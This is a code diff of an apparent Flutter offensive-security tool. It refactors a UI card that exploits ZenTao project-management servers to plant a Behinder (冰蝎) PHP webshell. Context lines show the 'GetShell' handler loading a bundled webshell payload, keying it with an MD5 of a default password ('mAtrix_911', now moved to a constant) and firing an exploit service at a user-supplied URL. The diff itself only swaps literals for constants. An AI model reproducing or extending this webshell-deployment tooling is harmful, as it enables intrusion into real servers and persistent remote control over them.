@@ -4,6 +4,7 @@ import 'package:crypto/crypto.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart' show rootBundle, Clipboard, ClipboardData;
 
+import '../app/constants.dart';
 import '../database/database_helper.dart';
 import '../exp/zentao/zentao_exp_service.dart';
 import '../models/project.dart';
@@ -123,7 +124,9 @@ class _ZentaoExpCard extends StatefulWidget {
 class _ZentaoExpCardState extends State<_ZentaoExpCard> {
   final _urlController = TextEditingController();
   final _timeoutController = TextEditingController(text: '10');
-  final _passwordController = TextEditingController(text: 'mAtrix_911');
+  final _passwordController = TextEditingController(
+    text: AppConstants.defaultShellPassword,
+  );
   final _logScrollController = ScrollController();
 
   String _log = '';
@@ -153,13 +156,15 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
   Future<void> _handleGetShell() async {
     final url = _urlController.text.trim();
     if (url.isEmpty) {
-      _appendLog('[!] 请输入禅道根路径，如 http://host/zentaopms/www');
+      _appendLog('[!] 请输入禅道根路径，如 http://localhost:8080');
       return;
     }
     setState(() => _running = true);
     _appendLog('[*] 尝试利用禅道 Repo 配置写入冰蝎 WebShell...');
     try {
-      final password = _passwordController.text.trim().isEmpty ? 'mAtrix_911' : _passwordController.text.trim();
+      final password = _passwordController.text.trim().isEmpty
+          ? AppConstants.defaultShellPassword
+          : _passwordController.text.trim();
       var shellContent = await rootBundle
           .loadString('assets/defaults/payloads/php_behinder.php');
       final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
@@ -167,7 +172,8 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
       final svc = ZentaoExpService(
         url: url,
         timeout: Duration(
-          seconds: int.tryParse(_timeoutController.text.trim()) ?? 10,
+          seconds: int.tryParse(_timeoutController.text.trim()) ??
+              AppConstants.defaultHttpTimeoutSeconds,
         ),
       );
       String? shellUrl;
@@ -420,7 +426,7 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
                               size: 12, color: AppColors.textPrimary),
                           decoration: _inputDecoration(
                             '禅道根路径',
-                            'http://host/zentaopms/www',
+                            'http://localhost:8080',
                           ),
                         ),
                         const SizedBox(height: 8),
@@ -438,7 +444,10 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
                           style: AppTextStyles.body(
                               size: 12, color: AppColors.textPrimary),
                           decoration:
-                              _inputDecoration('GetShell 密码', 'mAtrix_911'),
+                              _inputDecoration(
+                                'GetShell 密码',
+                                AppConstants.defaultShellPassword,
+                              ),
                         ),
                         const SizedBox(height: 16),
                         _sectionTitle('利用动作'),
